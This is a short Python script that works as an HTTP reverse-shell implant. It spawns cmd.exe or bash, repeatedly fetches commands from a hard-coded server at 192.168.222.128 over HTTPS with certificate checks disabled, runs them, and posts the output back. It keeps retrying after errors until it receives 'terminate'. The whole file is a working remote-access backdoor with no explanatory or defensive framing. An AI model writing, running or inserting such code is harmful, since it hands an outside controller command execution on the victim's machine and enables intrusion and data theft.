import requests
import sys
import time

from urllib3.exceptions import InsecureRequestWarning

if sys.platform == "win32":
    from pexpect import popen_spawn

    EXPECT_REGEX = r'\>$'
    p = popen_spawn.PopenSpawn('cmd.exe')

else:
    from pexpect import spawn

    EXPECT_REGEX = r'\$'
    p = spawn('bash', encoding='utf-8')


HOST = '192.168.222.128'
PORT = '443'
PROTO = 'HTTPS'
DEFAULT_TIMEOUT = 10

if PROTO == 'HTTPS':
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

p.expect(EXPECT_REGEX)

while True:

    try:
        req = requests.get(f'{PROTO}://{HOST}:{PORT}/', verify=False)
        command = req.text

        if 'terminate' in command:
            break

        p.sendline(command)
        p.expect(EXPECT_REGEX, timeout=DEFAULT_TIMEOUT)
        post_response = requests.post(url=f'{PROTO}://{HOST}:{PORT}/', data=p.before, verify=False)

        time.sleep(1)
    except Exception as e:
        time.sleep(20)
